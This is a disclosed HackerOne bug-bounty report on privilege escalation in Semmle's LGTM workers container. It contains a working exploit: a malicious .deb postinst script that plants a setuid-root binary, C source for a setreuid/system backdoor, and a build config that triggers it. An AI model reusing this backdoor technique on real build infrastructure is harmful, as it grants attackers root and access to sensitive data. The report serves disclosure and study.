---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '692603'
original_report_id: '692603'
title: Privilege escalation in workers container
weakness: Privilege Escalation
team_handle: semmle
created_at: '2019-09-11T21:37:46.480Z'
disclosed_at: '2019-09-25T01:31:38.767Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 202
asset_identifier: lgtm-com.pentesting.semmle.net
asset_type: URL
max_severity: critical
tags:
- hackerone
- privilege-escalation
---

# Privilege escalation in workers container

## Metadata

- HackerOne Report ID: 692603
- Weakness: Privilege Escalation
- Program: semmle
- Disclosed At: 2019-09-25T01:31:38.767Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

## Summary about the bugs:
In the prepare step, semmle allows user to install new package.

By upload a malicious package along with source code and force server to build this package, attacker will gain root access to the container

## Steps:

1. Create a malicious package contains the backdoor:

I use this guide (https://www.offensive-security.com/metasploit-unleashed/binary-linux-trojan/) to create the package.

With the content of ``postinst`` is

```
#!/bin/sh

ps -ef
sudo cp /opt/src/run /suidfs/passwd && sudo chown root:root /suidfs/passwd && sudo chmod 04755 /suidfs/passwd && ln -s /suidfs/passwd /usr/bin/setpasswd && setpasswd id &

```

Content of ``/opt/src/run``:

```
#include <stdio.h>
void main(int argc, char *argv[]) {
    setreuid(0, 0);
    system(argv[1]);
}
```
After that i will got a malicious ``.deb`` package.

2. Create a config file to install this malicious package:

Because the source code is imported before the ``prepare`` step happens, so i will be able to install this package by point directly to it like this ``/opt/src/work.deb``.

The install command now will be like this ``apt install -y --no-recommend /opt/src/work.deb``. And it is ``legal``.

The build config:
```
extraction:
  java:
    prepare:
      packages:
        - /opt/src/work.deb
    after_prepare:
      - echo pwned >> /opt/out/snapshot/log/build.log
      - /usr/bin/setpasswd 'id'
```
After that the build will failed, and attacker will get root on the container by running the setuid backdoor

## PoC is attached below

Thanks & regard!

## Impact

Attacker will get root access and will be able to dump every sensitive datas in the server!

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
